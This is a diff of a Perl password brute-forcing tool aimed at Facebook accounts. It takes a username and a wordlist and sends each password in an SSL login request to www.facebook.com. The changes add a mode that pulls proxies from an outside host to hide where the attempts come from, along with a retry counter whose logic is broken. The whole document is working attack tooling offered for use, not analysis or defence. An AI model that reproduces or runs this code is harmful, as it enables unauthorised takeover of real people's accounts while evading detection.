@@ -6,7 +6,7 @@ use Net::SSLeay::Handle;
 
 if(!defined($ARGV[0] && $ARGV[1])) {
 
-print "                               Version 1.00 (stable) \n";
+print "                               Version 2.32 \n";
 print "\033[1;32 \n";
 
 print "	  88   88   .d8b.   NNNNNN  88       	88      88    88 \n";
@@ -25,11 +25,12 @@ exit; }
 
 my $user = $ARGV[0];
 my $wordlist = $ARGV[1];
+my $proxy = $ARGV[2];
 
 open (LIST, $wordlist) || die "\n[-] Can't find/open $wordlist\n";
 
 
-print "                               Version 1.00 (stable)  \n";
+print "                               Version 2.50 \n";
 print "\033[1;32 \n";
 print "	      88   88   .d8b.   NNNNNN  88       	88      88    88 \n";
 print "	      88, ,88  d8' '8b    88    88       	88      88,  ,88 \n";
@@ -46,24 +47,30 @@ print "		=======================================================\n";
 print "\n\n";
 
 use strict;
-use warnings;
+#use warnings;
 use HTTP::ProxySelector;
 use LWP::UserAgent;
 
-my $selector = HTTP::ProxySelector->new(sites
-=>['http://www.samair.ru/proxy/fresh-proxy-list.htm'],
-testflag => 1,
-num_tries => 10,
-testsite => 'http://www.facebook.com');
-my $ua = LWP::UserAgent->new();
-$selector->set_proxy($ua);
-print 'Selected proxy: ',$selector->get_proxy(),"\n\n\n";
+sub proxies {
+	my $selector = HTTP::ProxySelector->new(sites
+	=>['http://chapuawe.webcindario.com/proxies.txt'],
+	testflag => 1,
+	num_tries => 10,
+	testsite => 'http://www.facebook.com');
+	my $ua = LWP::UserAgent->new();
+	$selector->set_proxy($ua);
+	print "Selected proxy: ",$selector->get_proxy(),"\n\n\n";
 
-my $url = "http://www.facebook.com";
+	my $url = "http://www.facebook.com";
 
-my $response = $ua->get($url) or die $!;
-my $content = $response->content() or die $!;
+	my $response = $ua->get($url) or die $!;
+	my $content = $response->content() or die $!;
+};
 
+if ($proxy == "-p")
+{
+	proxies();
+};
 
 while (my $password = <LIST>) {
 chomp ($password);
@@ -90,23 +97,35 @@ my $d = "Content-Length: $cl";
 my ($host, $port) = ("www.facebook.com", 443);
 
 tie(*SSL, "Net::SSLeay::Handle", $host, $port);
-  
+ 
+sslfb();
 
-print SSL "$a\n";
-print SSL "$b\n";
-print SSL "$c\n";
-print SSL "$d\n";
-print SSL "$e\n";
-print SSL "$f\n";
-print SSL "$g\n";
-print SSL "$h\n";
-print SSL "$i\n";
-print SSL "$j\n";
-print SSL "$k\n";
-print SSL "$l\n";
-print SSL "$cookie\n\n";
+sub sslfb{
+	print SSL "$a\n";
+	print SSL "$b\n";
+	print SSL "$c\n";
+	print SSL "$d\n";
+	print SSL "$e\n";
+	print SSL "$f\n";
+	print SSL "$g\n";
+	print SSL "$h\n";
+	print SSL "$i\n";
+	print SSL "$j\n";
+	print SSL "$k\n";
+	print SSL "$l\n";
+	print SSL "$cookie\n\n";
 
-print SSL "$post\n";
+	print SSL "$post\n";
+}
+
+my $limite = 50;
+my $contrasenas = 0;
+
+if ($contrasenas == $limite)
+{
+	sslfb();
+	$limite = $limite+$contrasenas
+}
 
 my $success;
 while(my $result = <SSL>){
@@ -118,6 +137,7 @@ if (!defined $success)
 {
 print "\033[1;31m[-] $password -> Failed \n";
 close SSL;
+$contrasenas = $contrasenas+1;
 }
 else
 {
